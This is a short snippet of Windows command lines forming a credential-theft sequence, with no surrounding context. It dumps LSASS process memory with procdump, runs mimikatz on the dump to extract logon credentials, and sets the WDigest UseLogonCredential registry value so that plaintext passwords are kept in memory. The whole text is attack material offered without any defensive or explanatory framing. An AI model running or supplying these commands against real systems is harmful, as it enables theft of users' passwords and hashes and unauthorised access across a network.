procdump64.exe -accepteula -ma lsass.exe lsass.dmp
mimikatz.exe lsass.dmp
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
